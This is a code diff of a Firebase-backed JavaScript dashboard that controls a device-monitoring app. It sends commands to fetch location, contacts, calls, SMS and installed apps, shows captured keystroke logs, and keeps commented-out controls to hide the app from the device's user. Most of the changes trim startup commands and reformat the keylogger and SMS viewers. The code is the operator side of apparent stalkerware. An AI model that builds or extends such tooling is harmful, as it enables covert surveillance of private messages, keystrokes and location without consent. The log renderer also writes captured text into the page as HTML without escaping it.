@@ -4,6 +4,7 @@ import {
   getDatabase,
   ref,
   set,
+  push, // ✅ Add this line
   onValue,
   onChildAdded,
   get
@@ -35,13 +36,18 @@ let dashboardInitialized = false;
 function sendCommand(section, commandValue) {
   const user = auth.currentUser;
   if (!user) return console.warn("User not authenticated");
+
   const commandRef = ref(db, `users/${user.uid}/${section}/command`);
+
   set(commandRef, {
     value: commandValue,
     timestamp: new Date().toISOString()
-  }).then(() => console.log(`✅ Sent '${commandValue}' to ${section}`))
-    .catch(err => console.error("❌ Command Error:", err));
+  })
+  .then(() => console.log(`✅ Sent '${commandValue}' to ${section}`))
+  .catch(err => console.error("❌ Command Error:", err));
 }
+
+
 
 onAuthStateChanged(auth, (user) => {
   if (user && !dashboardInitialized) {
@@ -58,9 +64,12 @@ function initializeDashboard() {
     signOut(auth).then(() => window.location.href = "index.html");
   });
 
-  // Send all startup commands
-  ["status", "battery", "lastSeen", "location", "installedApps", "calls", "contacts", "keylogger", "sms", "remote-command", "geo-fence"]
-    .forEach(section => sendCommand(section, `get${section.charAt(0).toUpperCase() + section.slice(1)}`));
+ // ✅ Only auto-send essential commands
+[
+  { section: "status", command: "getStatus" },
+  { section: "battery", command: "getBattery" },
+  { section: "lastSeen", command: "getLastSeen" }
+].forEach(({ section, command }) => sendCommand(section, command));
 
   const userRef = ref(db, `users/${uid}`);
   onValue(userRef, (snapshot) => {
@@ -162,7 +171,7 @@ function initializeDashboard() {
 
   document.getElementById("refreshSiteBtn")?.addEventListener("click", () => location.reload());
 
-  // ✅ Dynamic Side Panel Command Handler
+  // ✅ Side Panel Dynamic Handler
   document.addEventListener("DOMContentLoaded", () => {
     document.querySelectorAll(".side-features a").forEach(link => {
       link.addEventListener("click", (e) => {
@@ -182,7 +191,7 @@ function initializeDashboard() {
     });
   });
 
-  // ✅ SMS Log Realtime & Filtering
+  // ✅ SMS Logs
   const smsLogs = [];
 
   function renderSMSLogs() {
@@ -230,52 +239,49 @@ function initializeDashboard() {
     document.getElementById(id)?.addEventListener("input", renderSMSLogs);
   });
 
-  //Start of keylogger
- // Start of keylogger
-const keylogBody = document.getElementById("logBody");
-const keylogSearch = document.getElementById("searchInput");
+  // ✅ Keylogger
+  const keylogBody = document.getElementById("logBody");
+  const keylogSearch = document.getElementById("searchInput");
 
-if (keylogBody && keylogSearch) {
-  const keylogs = [];
-  const keylogRef = ref(db, `users/${uid}/keyloggers`);
+  if (keylogBody && keylogSearch) {
+    const keylogs = [];
+    const keylogRef = ref(db, `users/${uid}/keyloggers`);
 
-  onChildAdded(keylogRef, (snap) => {
-    const data = snap.val();
-    if (data) {
-      keylogs.push(data);
-      renderKeylogs();
-    }
-  });
-
-  function renderKeylogs() {
-    const query = keylogSearch.value.toLowerCase();
-    keylogBody.innerHTML = "";
-
-    const filtered = keylogs.filter(log =>
-      !query || (log.text || "").toLowerCase().includes(query)
-    );
-
-    filtered.forEach(log => {
-      const row = document.createElement("tr");
-      row.innerHTML = `
-        <td style="padding: 8px; border-bottom: 1px solid #444;">${new Date(log.timestamp || Date.now()).toLocaleString()}</td>
-        <td style="padding: 8px; border-bottom: 1px solid #444;">${log.text || ''}</td>
-      `;
-      keylogBody.appendChild(row);
+    onChildAdded(keylogRef, (snap) => {
+      const data = snap.val();
+      if (data) {
+        keylogs.push(data);
+        renderKeylogs();
+      }
     });
+
+    function renderKeylogs() {
+      const query = keylogSearch.value.toLowerCase();
+      keylogBody.innerHTML = "";
+
+      const filtered = keylogs.filter(log =>
+        !query || (log.text || "").toLowerCase().includes(query)
+      );
+
+      filtered.forEach(log => {
+        const row = document.createElement("tr");
+        row.innerHTML = `
+          <td style="padding: 8px; border-bottom: 1px solid #444;">${new Date(log.timestamp || Date.now()).toLocaleString()}</td>
+          <td style="padding: 8px; border-bottom: 1px solid #444;">${log.text || ''}</td>
+        `;
+        keylogBody.appendChild(row);
+      });
+    }
+
+    keylogSearch.addEventListener("input", renderKeylogs);
   }
 
-  keylogSearch.addEventListener("input", renderKeylogs);
-}
-// End of keylogger
+//   // ✅ Hide/Unhide Toggle Command Sender
+//  const hideToggle = document.getElementById("hideToggle");
+//   const unhideToggle = document.getElementById("unhideToggle");
 
-// End of keylogger
-}
-
-function displayNoneDashboard() {
-  document.getElementById("dashboardMain").style.display = "none";
+//   hideToggle?.addEventListener("click", () => sendCommand("remote-command", "hideApp"));
+//   unhideToggle?.addEventListener("click", () => sendCommand("remote-command", "unhideApp"));
+ 
 }
 
-function displayBlockDashboard() {
-  document.getElementById("dashboardMain").style.display = "block";
-}
